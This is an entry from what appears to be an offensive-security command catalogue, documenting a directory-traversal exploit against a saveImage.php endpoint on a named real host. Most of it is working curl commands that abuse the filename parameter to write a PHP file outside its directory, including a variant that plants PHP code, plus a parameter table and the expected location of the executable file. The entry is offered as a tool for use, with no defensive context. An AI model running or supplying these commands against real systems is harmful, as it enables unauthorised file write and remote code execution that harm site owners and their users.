---
data: >-
  curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d
  "image=SomeContent&filename=/../../zigoo&extension=php"
tags:
  - directory-traversal
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:08.039Z'
id: 450ad4c3-4c09-4327-a26b-32442eff99b2
verified: false
validated: true
submitted: true
---
# saveimage-traversal-php

## Command

```bash
curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=SomeContent&filename=/../../zigoo&extension=php"
```

## Description

Exploits directory traversal to create a PHP file outside the intended directory using the vulnerable filename parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| image | Content to write (e.g., SomeContent) | Yes |
| filename | Traversed path (e.g., /../../zigoo) | Yes |
| extension | .php to make executable | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=SomeContent&filename=/../../zigoo&extension=php"
```

### Advanced Usage

With custom content:

```bash
curl -X POST https://reverb.twitter.com/api/actions/saveImage.php -d "image=<?php echo 'test'; ?>&filename=/../../test&extension=php"
```

## Expected Output

File created at /var/www/html/view/data/zigoo.php; accessible and executable at https://reverb.twitter.com/view/data/zigoo.php.

## Related

- [[commands/saveimage-normal-post]]
- [[procedures/Exploit-Directory-Traversal-for-Arbitrary-File-Write]]
